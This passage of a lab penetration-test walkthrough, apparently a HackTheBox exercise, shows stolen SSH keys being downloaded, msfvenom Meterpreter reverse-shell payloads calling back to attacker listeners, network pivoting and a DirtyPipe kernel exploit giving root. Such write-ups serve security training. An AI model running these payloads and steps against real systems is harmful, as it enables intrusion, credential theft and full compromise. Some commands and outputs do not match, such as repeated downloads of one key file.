Looking at the networking directory in the department shares, we can find SSH keys:
```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> dir


    Directory: C:\Department Shares\IT\Private\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022  11:34 AM           1706 harry-id_rsa
-a----         6/1/2022  11:34 AM           1702 james-id_rsa
-a----         6/1/2022  11:34 AM           1706 ssmallsadm-id_rsa
```

Let's download them to our machine:
```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download ".\harry-id_rsa" /root/HackTheBox/Paths/CPTS/AEN/Compromise/harry-id_rsa
                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\harry-id_rsa to /root/HackTheBox/Paths/CPTS/AEN/Compromise/harry-id_rsa                                                        
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download ".\harry-id_rsa" /root/HackTheBox/Paths/CPTS/AEN/Compromise/james-id_rsa
                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\harry-id_rsa to /root/HackTheBox/Paths/CPTS/AEN/Compromise/james-id_rsa                                                        
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download ".\harry-id_rsa" /root/HackTheBox/Paths/CPTS/AEN/Compromise/ssmallsadm-id_rsa
                                        
Info: Downloading C:\Department Shares\IT\Private\Networking\harry-id_rsa to /root/HackTheBox/Paths/CPTS/AEN/Compromise/ssmallsadm-id_rsa                                                   
                                        
Info: Download successful!
```

First we will create the reverse shell payload:
```shell-session
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.23 -f elf -o backupjob LPORT=8080
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Using the shell we created let's get a meterpreter session to the Ubuntu host:
```shell-session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8080
```

Let's run the payload on the target:
```shell-session
root@dmz01:~# chmod +x backupjob 
root@dmz01:~# ./backupjob
```

We will now configure SOCKS proxy for pivoting:
```shell-session
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
[*] Stopping the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) >
```

We will now add a route to the 172.16.8.0/23 subnet:
```shell-session
meterpreter > run autoroute -s 172.16.8.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.8.0/255.255.254.0...
[+] Added route to 172.16.8.0/255.255.254.0 via 10.129.229.147
[*] Use the -p option to list all active routes
```

Next let's create a payload for the DC01 machine:
```shell-session
# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=172.16.8.120 LPORT=1234 -o script.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: script.exe
```

We will now add a port forwarding rule to connect from the Windows host to our listener:
```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.16.23

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

Now we will start the listener:
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
[*] Sending stage (201798 bytes) to 10.10.16.23
[*] Meterpreter session 2 opened (10.10.16.23:8081 -> 10.10.16.23:40131) at 2024-07-23 18:37:50 +0300

meterpreter >
```

Running a ping sweep we find another live host:
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.9.0/24

[*] Performing ping sweep for IP range 172.16.9.0/24
[+]     172.16.9.3 host found
[+]     172.16.9.25 host found
```

Let's add a route to the 172.16.9.0/23 subnet:
```shell-session
meterpreter > run autoroute -s 172.16.9.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.16.23
[*] Use the -p option to list all active routes
```

We are now successful logging in with the ssmallsadm user:
```shell-session
# proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 23 Jul 2024 04:53:27 PM UTC

  System load:  0.0                Processes:               229
  Usage of /:   27.4% of 13.72GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 172.16.9.25
  Swap usage:   0%


159 updates can be applied immediately.
103 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
ssmallsadm@MGMT01:~$
```

Looking at the kernel version we can see the system is outdated:
```shell-session
ssmallsadm@MGMT01:~$ uname -a
Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Now let's copy the exploit code from [here](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-1.c) to the target machine.

We can then compile and run the exploit and get a root shell:
```shell-session
ssmallsadm@MGMT01:~$ vim exp1.c
ssmallsadm@MGMT01:~$ gcc exp1.c -o exp1
ssmallsadm@MGMT01:~$ chmod +x exp1
ssmallsadm@MGMT01:~$ ./exp1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
whoami
root
```
